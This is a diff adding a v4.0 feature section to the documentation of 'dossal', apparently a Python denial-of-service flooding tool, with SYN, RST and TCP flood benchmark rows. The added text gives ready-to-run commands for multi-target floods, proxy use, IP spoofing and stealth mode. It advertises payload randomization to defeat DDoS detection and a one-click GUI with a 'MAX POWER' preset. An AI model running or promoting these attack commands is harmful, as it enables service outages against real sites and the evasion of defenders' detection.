@@ -228,3 +228,35 @@ dossal.py (single file, Python asyncio + multiprocessing)
 | syn | node:8080 | 4p | 2s | 15,368 conns | 9,954 |
 | rst | node:8080 | 8p | 2s | 12,608 conns | 399 |
 | tcp | node:8080 | 8p | 2s | 420 pps | 0 |
+
+## v4.0 New Features
+
+### One-Click GUI (Windows-first)
+```
+python dossal_gui.py
+```
+3 presets: **MAX POWER** / **STEALTH** / **SPEED** — one-click, minimal input.
+
+### Payload Randomization
+Random path, User-Agent, headers, size — defeats signature-based DDoS detection.
+
+### Multi-Target
+```bash
+dossal --mode raw --targets "http://target1.com,http://target2.com" --duration 30
+```
+
+### Proxy Support
+```bash
+dossal --mode raw --url target.com --proxy socks5://user:pass@proxy:1080
+```
+
+### Windows IP Spoofing
+```bash
+dossal --mode udp --url udp://target:443 --spoof 100 --stealth
+dossal --mode syn --url tcp://target:80 --spoof 100
+```
+
+### Dry-Run (Simulation)
+```bash
+dossal --url target.com --spoof 100 --stealth --dry-run
+```
